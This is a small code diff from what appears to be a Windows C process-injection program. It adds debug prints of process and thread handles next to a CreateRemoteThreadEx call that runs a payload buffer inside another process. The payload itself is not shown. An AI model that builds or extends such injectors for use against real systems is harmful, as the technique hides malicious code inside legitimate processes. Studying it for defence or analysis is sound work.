@@ -92,6 +92,9 @@ int main(int argc, char* argv[]) {
   /* CREATE THREAD TO RUN PAYLOAD */
   hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &TID);
 
+  printf("\nhProccess grabbed: %p", hProcess);
+  printf("\nhThread grabbed: %p", hThread);
+
   /* CREATED NEW THREAD TO EXEC? */
   if (hThread == NULL) {
     printf("%s failed to get a handle to the thread, error: %ld", e, GetLastError());
